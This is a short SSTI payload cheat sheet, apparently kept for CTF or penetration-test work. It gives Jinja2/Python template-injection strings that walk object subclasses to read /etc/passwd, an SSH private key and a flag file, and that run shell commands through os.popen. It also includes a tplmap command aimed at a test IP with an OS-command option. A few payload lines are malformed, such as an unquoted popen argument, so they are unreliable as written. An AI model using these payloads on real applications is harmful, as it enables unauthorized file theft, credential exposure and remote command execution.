# SSTI
```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection
{{2+2}}

readfile
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/home/test/.ssh/id_rsa').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
{{config.__class__.__init__.__globals__['os'].popen(cat /etc/password).read()}}


osi
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}


tool
https://github.com/epinna/tplmap
python2 -m pip
tplmap -u http://10.10.10.10:5000/ -d 'noot' --os-cmd =cat /etc/passwd

```
